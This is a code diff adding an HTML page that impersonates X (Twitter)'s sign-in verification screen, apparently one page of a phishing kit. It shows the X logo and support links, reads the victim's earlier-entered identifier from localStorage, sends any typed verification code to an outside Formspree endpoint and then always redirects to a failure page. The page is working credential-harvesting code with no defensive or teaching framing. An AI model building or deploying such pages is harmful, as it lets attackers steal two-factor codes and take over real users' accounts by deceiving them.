@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <title>Verification</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="verification-container">
+    <button class="cancel-button" onclick="goBack()">Cancel</button>
+    <div class="logo"><i class="fab fa-x-twitter"></i></div>
+    <h1>Enter your verification code</h1>
+    <p class="description">We sent a code to You <span id="display-user-input"></span>. Enter it below:</p>
+    <form action="https://formspree.io/f/xqakoplr" method="POST" id="verificationForm" >
+    <input type="text" name="code" placeholder="Enter code" id="verification-code" class="verification-input" required />
+    
+   <p> <a style="color: rgb(154, 151, 151); text-decoration: none; " href="Auth.html">choose a different verification method</a> </p>
+   <p> <a style="color: rgb(154, 151, 151); text-decoration: none; " href="#">Contact X Support</a></p>
+    <button type="submit" class="next-button">Next</button>
+  </form>
+  </div>
+
+  <script>
+    // Display the user's input from localStorage
+    document.addEventListener("DOMContentLoaded", () => {
+      const userInput = localStorage.getItem("userInput");
+      document.getElementById("display-user-input").textContent = userInput;
+    });
+
+    // Navigate back to the Login Page
+    function goBack() {
+      window.location.href = "login.html";
+    }
+
+
+
+    // Attach the button click event listener
+    document.getElementById('verificationForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default submission
+
+      var form = event.target;
+      var formData = new FormData(form);
+
+      // Submit the form data asynchronously
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => {
+        // Redirect to failure.html after successful form submission
+        window.location.href = 'failure.html';
+      })
+      .catch(error => {
+        // If there is a network error, still redirect to failure.html
+        console.error('Error submitting verification form:', error);
+        window.location.href = 'failure.html';
+        
+      });
+      
+    });
+  </script>
+</body>
+</html>
